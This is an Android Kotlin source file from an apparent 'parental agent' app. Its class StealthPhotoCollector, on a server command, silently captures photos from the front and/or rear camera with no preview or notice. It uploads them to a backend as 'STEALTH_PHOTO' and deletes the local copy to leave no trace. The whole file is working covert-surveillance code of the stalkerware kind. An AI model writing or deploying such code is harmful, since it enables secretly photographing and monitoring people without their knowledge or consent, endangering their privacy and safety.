package com.parental.agent.collectors.media

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.sync.ApiConstants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume

class StealthPhotoCollector(private val context: Context) {

    companion object {
        private const val TAG = "StealthPhotoCollector"
        private const val CAPTURE_TIMEOUT_MS = 10000L // 10s maximum timeout per camera
    }

    suspend fun captureStealthPhoto(cameraFacing: String = "FRONT", commandId: String? = null): Boolean = withContext(Dispatchers.IO) {
        val result: Pair<Boolean, String?> = if (cameraFacing.equals("BOTH", ignoreCase = true)) {
            Log.i(TAG, "📸 Initiating Dual Stealth Photo Capture (FRONT + REAR)...")
            val frontResult = captureSingleCamera("FRONT")
            delay(1000) // Brief delay between hardware camera switches
            val rearResult = captureSingleCamera("REAR")

            val combinedSuccess = frontResult.first || rearResult.first
            val combinedError = if (combinedSuccess) null else (frontResult.second ?: rearResult.second ?: "Dual camera capture failed")
            Pair(combinedSuccess, combinedError)
        } else {
            captureSingleCamera(cameraFacing)
        }

        if (!commandId.isNullOrEmpty()) {
            notifyCommandStatus(
                commandId = commandId,
                status = if (result.first) "SUCCESS" else "FAILED",
                errorMsg = result.second
            )
        }

        return@withContext result.first
    }

    private suspend fun captureSingleCamera(cameraFacing: String): Pair<Boolean, String?> {
        val prefs = AppPreferences(context)
        val deviceId = prefs.getDeviceId()
        if (deviceId.isEmpty()) {
            return Pair(false, "Device not registered")
        }

        val capturedBytes = withTimeoutOrNull(CAPTURE_TIMEOUT_MS) {
            captureCameraBytes(cameraFacing)
        }

        if (capturedBytes == null || capturedBytes.isEmpty()) {
            Log.e(TAG, "Failed to capture stealth photo or timed out (facing=$cameraFacing)")
            return Pair(false, "Camera hardware timeout or empty frame (facing=$cameraFacing)")
        }

        return try {
            val facingTag = if (cameraFacing.equals("REAR", ignoreCase = true)) "rear" else "front"
            val timestamp = System.currentTimeMillis()
            val fileName = "stealth_photo_${facingTag}_$timestamp.jpg"

            val tempFile = File(context.cacheDir, fileName)
            FileOutputStream(tempFile).use { out ->
                out.write(capturedBytes)
            }

            Log.i(TAG, "📸 Stealth photo captured successfully ($facingTag camera, ${tempFile.length() / 1024} KB). Uploading to backend...")
            val galleryCollector = PhotoGalleryCollector(context)
            val uploadSuccess = galleryCollector.uploadPhotoToServer(tempFile, deviceId, fileName, category = "STEALTH_PHOTO")

            tempFile.delete()
            if (uploadSuccess) {
                Pair(true, null)
            } else {
                Pair(false, "Upload to server failed after photo capture")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error saving or uploading stealth photo: ${e.message}", e)
            Pair(false, "Error saving/uploading photo: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun captureCameraBytes(cameraFacing: String): ByteArray? = suspendCancellableCoroutine { continuation ->
        var cameraDevice: CameraDevice? = null
        var captureSession: CameraCaptureSession? = null
        var imageReader: ImageReader? = null
        var handlerThread: HandlerThread? = null
        val resumed = AtomicBoolean(false)

        fun finishWithResult(result: ByteArray?) {
            if (resumed.compareAndSet(false, true)) {
                try {
                    captureSession?.close()
                    captureSession = null
                } catch (e: Exception) {
                    Log.w(TAG, "Session close error: ${e.message}")
                }

                if (cameraDevice != null) {
                    try {
                        cameraDevice?.close()
                    } catch (e: Exception) {
                        Log.w(TAG, "Camera close error: ${e.message}")
                    }
                    cameraDevice = null
                } else {
                    // Camera device was never opened, safe to release reader & handlerThread directly
                    try {
                        imageReader?.close()
                        imageReader = null
                        handlerThread?.quitSafely()
                        handlerThread = null
                    } catch (e: Exception) {
                        Log.w(TAG, "Direct cleanup error: ${e.message}")
                    }
                }

                if (continuation.isActive) {
                    continuation.resume(result)
                }
            }
        }

        continuation.invokeOnCancellation {
            finishWithResult(null)
        }

        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val targetFacing = if (cameraFacing.equals("REAR", ignoreCase = true)) {
                CameraCharacteristics.LENS_FACING_BACK
            } else {
                CameraCharacteristics.LENS_FACING_FRONT
            }

            var selectedCameraId: String? = null
            for (id in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    selectedCameraId = id
                    break
                }
            }

            if (selectedCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                selectedCameraId = cameraManager.cameraIdList[0]
            }

            if (selectedCameraId == null) {
                Log.e(TAG, "No suitable camera ID found on device for facing=$cameraFacing.")
                finishWithResult(null)
                return@suspendCancellableCoroutine
            }

            val thread = HandlerThread("StealthCameraThread").apply { start() }
            handlerThread = thread
            val handler = Handler(thread.looper)

            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2).apply {
                setOnImageAvailableListener({ reader ->
                    var image: Image? = null
                    try {
                        image = reader.acquireNextImage()
                        if (image != null) {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            finishWithResult(bytes)
                        } else {
                            finishWithResult(null)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error acquiring image: ${e.message}")
                        finishWithResult(null)
                    } finally {
                        image?.close()
                    }
                }, handler)
            }

            cameraManager.openCamera(selectedCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val reader = imageReader ?: return
                        val surface = reader.surface
                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(surface)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        }

                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                try {
                                    session.capture(captureBuilder.build(), null, handler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "Failed to execute camera capture: ${e.message}")
                                    finishWithResult(null)
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Camera capture session configuration failed.")
                                finishWithResult(null)
                            }
                        }, handler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error creating camera capture session: ${e.message}")
                        finishWithResult(null)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera disconnected.")
                    finishWithResult(null)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera device error: $error")
                    finishWithResult(null)
                }

                override fun onClosed(camera: CameraDevice) {
                    Log.d(TAG, "Camera device cleanly closed callback received.")
                    try {
                        imageReader?.close()
                        imageReader = null
                        handlerThread?.quitSafely()
                        handlerThread = null
                    } catch (e: Exception) {
                        Log.w(TAG, "onClosed cleanup error: ${e.message}")
                    }
                }
            }, handler)

        } catch (e: Exception) {
            Log.e(TAG, "Exception opening stealth camera: ${e.message}", e)
            finishWithResult(null)
        }
    }

    private fun notifyCommandStatus(commandId: String, status: String, errorMsg: String? = null) {
        try {
            val prefs = AppPreferences(context)
            val deviceId = prefs.getDeviceId()
            val client = OkHttpClient()
            val baseUrl = ApiConstants.BASE_URL.trimEnd('/')
            val url = if (baseUrl.endsWith("/api/v1")) "$baseUrl/commands/status" else "$baseUrl/api/v1/commands/status"

            val json = org.json.JSONObject().apply {
                put("deviceId", deviceId)
                put("commandId", commandId)
                put("status", status)
                if (!errorMsg.isNullOrEmpty()) put("error", errorMsg)
            }

            val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().close()
            Log.i(TAG, "Posted command status to backend: commandId=$commandId, status=$status")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to send command status update: ${e.message}")
        }
    }
}
